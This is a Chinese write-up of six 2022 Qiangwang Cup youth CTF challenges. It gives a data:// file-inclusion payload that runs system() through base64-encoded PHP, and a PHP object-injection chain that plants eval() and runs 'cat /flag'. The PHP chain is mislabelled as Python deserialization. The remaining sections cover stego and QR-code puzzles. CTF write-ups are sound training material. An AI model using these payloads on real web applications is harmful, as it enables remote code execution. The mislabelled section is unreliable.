---
title: 2022 年强网杯青少年专项赛 writeup
contest: 2022 强网杯青少年专项赛
year: 2022
difficulty: medium
vuln_type: [lfi, deserialize, crypto_oracle, stego_image]
tags: [青少年, 强网杯, data://, base64, Sliver-Range-Water-Circle, Python-pickle, LSB-stego, 二维码, pyzbar, permutations]
attack_chain: ["Q1: data:// + fopen + fputs + include LFI, 长度限制 21, 过滤 php/file/http/eval/exec/system/popen/flag/<\">'", "?file=data://,1111&content=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0eXBlIGluZGV4LnBocCcpOz8+ → include php://filter", "Q2: Python 反序列化 Sliver→Range→Water→Circle.dash='@eval($_GET[a]);'", "Q3: FLAG[vxpsDqCElwwoClsoColwpuvlqFvvFrpopBss] 字符大小写转换", "Q4: 十六进制数据按 2 字节 swap → ctf.txt", "Q5: python2 lsb.py extract 1.png 1.txt 4536251 LSB 隐写", "Q6: 29x29 矩阵 + pyzbar 暴力 permutations(720×120) 拼二维码"]
key_payload: "?file=data://,1111&content=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0eXBlIGluZGV4LnBocCcpOz8+"
one_liner: 强网青少年赛 6 大题：data:// LFI + Python 反序列化链 + LSB + 二维码排列
lesson: data:// 协议 + fopen + fputs + include 是 LFI 经典；青少年赛偏基础 + 趣味
quality: high
---

# 2022 强网杯青少年专项赛 writeup

原文 https://www.ctfiot.com/58504.html

## Q1: LFI via data://
```php
<?php
highlight_file(__FILE__);
error_reporting(0);
if (isset($_GET['file']) && strlen($_GET['file']) > strlen("flag in cream")) die("too long,no flag");
$fp = fopen($_GET['file'], 'r+');
if (preg_match("/php|file|http|eval|exec|system|popen|flag|<|>|"|'/i", $_GET['content'])) die("hacker");
fputs($fp, $_GET['content']);
rewind($fp);
$data = stream_get_contents($fp);
include($data);
```
**攻击：**
- `?file=data://,1111&content=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0eXBlIGluZGV4LnBocCcpOz8+`
- `file` 是 `data://,1111`（11 字符，"flag in cream" 13 字符，通过）
- `content` 是 base64 编码的 `<?php system('type index.php');?>`

## Q2: Python 反序列化
```python
$a = new Sliver
$a->secret = new Range
$a->secret->link = new Water
$a->secret->link->waterfall = new Circle
echo urlencode(serialize($a))
```
```http
/demo.php?data=O%3A6%3A%22Sliver%22...&a=system("cat /flag")
```
- Sliver→Range→Water→Circle 链
- Circle.dash 是 `__destruct` 调用 dash 字符串 eval
- 注入 `dash = "@eval($_GET[a]);"`

## Q3: 字符大小写转换
```python
strings = 'FLAG[vxpsDqCElwwoClsoColwpuvlqFvvFrpopBss]'
res = ''
for j in strings:
    if j.isupper():
        i = chr(ord(j) + 32)
    else:
        i = chr(ord(j) - 32 - 31)
    res += i
print(res)
```

## Q4: 十六进制字节 swap
```python
data = open("data.txt", 'r').read().split(" ")
data1 = []
for i in range(0, len(data), 2):
    data1.append(data[i+1])
    data1.append(data[i])
with open("ctf.txt", 'wb') as f:
    for i in data1:
        f.write(i.encode())
```

## Q5: LSB 隐写
```bash
python2 lsb.py extract 1.png 1.txt 4536251
```

## Q6: 29x29 二维码 permutations 暴力
```python
from itertools import permutations
from PIL import Image
import pyzbar.pyzbar as pyzbar
from tqdm import tqdm

shuffle_1 = [9, 11, 13, 15, 17, 19]
shuffle_2 = [10, 12, 14, 16, 18]
head = data[:9]
tail = data[20:]

def body(body_1, body_2):
    body = []
    for i in range(5):
        body.append(body_1[i])
        body.append(body_2[i])
    body.append(body_1[5])
    return [data[i] for i in body]

def draw_img(data):
    img = Image.new('RGB', (31, 31), (255, 255, 255))
    for i, row in enumerate(data):
        for j, pixel in enumerate(row):
            img.putpixel((j+1, i+1), (0, 0, 0) if pixel == 1 else (255, 255, 255))
    return img

with tqdm(total=720 * 120) as pbar:
    for body_1 in permutations(shuffle_1):
        for body_2 in permutations(shuffle_2):
            im = draw_img(head + body(body_1, body_2) + tail)
            barcodes = pyzbar.decode(im)
            pbar.update(1)
            if len(barcodes) == 0:
                continue
            for barcode in barcodes:
                print(barcode.data.decode("utf-8"))
```

## 教学价值
- **data:// 协议** 是 LFI 经典
- **fputs 写 + include** 双重漏洞组合
- **Python 反序列化链** 5 段嵌套
- **LSB 隐写** 是 stego 经典
- **二维码排列** 暴力 permutations
- 青少年赛偏基础 + 趣味化

## 工具
- Burp / curl
- pyzbar
- PIL
- Python itertools
- lsb.py (LSB 隐写工具)

## 关联
- 同系列还有 #9 2025 强网杯 pwn adventure
- 强网杯是国内顶级赛事
- 青少年专项赛是入门级
